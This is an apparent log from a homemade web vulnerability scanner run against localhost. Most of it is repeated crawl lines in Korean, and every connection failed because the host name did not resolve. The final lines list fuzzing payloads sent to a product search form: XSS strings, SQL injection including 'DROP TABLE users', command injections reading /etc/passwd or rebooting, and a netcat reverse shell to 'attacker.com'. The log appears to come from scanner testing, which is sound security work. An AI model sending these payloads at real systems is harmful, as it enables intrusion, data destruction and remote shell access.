2024-10-30 20:32:57,457 - ERROR - robots.txt 접근 실패 - 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: /robots.txt (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x105393740>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:32:57,457 - INFO - [StaticCrawler] 방문 중: http://www.localhost:3000/
2024-10-30 20:32:57,458 - ERROR - [StaticCrawler] 요청 실패 - URL: http://www.localhost:3000/, 에러: HTTPConnectionPool(host='www.localhost', port=3000): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPConnection object at 0x105393ef0>: Failed to resolve 'www.localhost' ([Errno 8] nodename nor servname provided, or not known)"))
2024-10-30 20:32:57,458 - INFO - [StaticCrawler] 크롤링 완료: 0개의 URL 수집.
2024-10-30 20:33:55,481 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,491 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,508 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,524 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,551 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,560 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,578 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,588 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,606 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,615 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,632 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,641 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,658 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,668 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,685 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,696 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,712 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,722 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,739 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,748 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,767 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,776 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,794 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,804 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,822 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,832 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,850 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,860 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,878 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,888 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,906 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,915 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,932 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,942 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,960 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,970 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:55,988 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:55,998 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,016 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,025 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,043 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,054 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,070 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,080 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,098 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,107 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,124 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,134 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,151 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,161 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,178 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,188 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,205 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,214 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,232 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,242 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,261 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,271 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,288 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,299 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,315 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,326 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,344 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,354 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,370 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,380 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,398 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,407 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,424 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,435 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,451 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,462 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,479 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,488 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,506 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,516 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,533 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,543 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,561 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,570 - INFO - [DynamicCrawler] 방문 중: http://www.localhost:3000, 깊이: 5
2024-10-30 20:33:56,589 - INFO - [DynamicCrawler] 발견된 폼: 0개, 독립 입력 필드: 0개 - URL: http://www.localhost:3000/
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,599 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,600 - INFO - [DynamicCrawler] 최대 깊이(5) 도달 - URL: http://www.localhost:3000, 스킵.
2024-10-30 20:33:56,678 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<img src=x onerror=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''; DROP TABLE users; --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' #', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<svg/onload=alert('XSS')>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' /*', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '<script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1' ({', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: ''"><script>alert('XSS')</script>', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: 'admin' --', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,679 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,680 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '`reboot`', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,680 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '$(reboot)', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,680 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| nc -e /bin/sh attacker.com 1234', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,680 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '' OR '1'='1', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,680 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '&& cat /etc/passwd', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
2024-10-30 20:33:56,680 - ERROR - [AsyncFuzzer] 요청 실패 - 폼: http://www.localhost:3000/products/search, 페이로드: '| whoami', 에러: Cannot connect to host www.localhost:3000 ssl:default [nodename nor servname provided, or not known]
